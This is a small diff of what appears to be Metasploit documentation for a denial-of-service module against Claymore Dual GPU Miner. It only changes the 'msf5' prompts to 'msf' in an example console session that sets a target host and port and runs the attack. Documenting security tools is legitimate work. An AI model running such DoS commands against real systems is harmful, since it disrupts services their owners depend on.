@@ -16,8 +16,8 @@ Claymore Dual GPU Miner<=10.5
 ### Claymore Dual GPU Miner/10.0 - window7
 
 ```
-msf5 > use auxiliary/dos/tcp/claymore_dos
-msf5 auxiliary(dos/tcp/claymore_dos) > show options
+msf > use auxiliary/dos/tcp/claymore_dos
+msf auxiliary(dos/tcp/claymore_dos) > show options
 
 Module options (auxiliary/dos/tcp/claymore_dos):
 
@@ -26,9 +26,9 @@ Module options (auxiliary/dos/tcp/claymore_dos):
    rhost                   yes       The target address
    rport  3333             yes       The target port
 
-msf5 auxiliary(dos/tcp/claymore_dos) > set rhost 127.0.0.1
+msf auxiliary(dos/tcp/claymore_dos) > set rhost 127.0.0.1
 rhost => 127.0.0.1
-msf5 auxiliary(dos/tcp/claymore_dos) > run
+msf auxiliary(dos/tcp/claymore_dos) > run
 
 [*] Starting server...
 [*] Creating sockets...
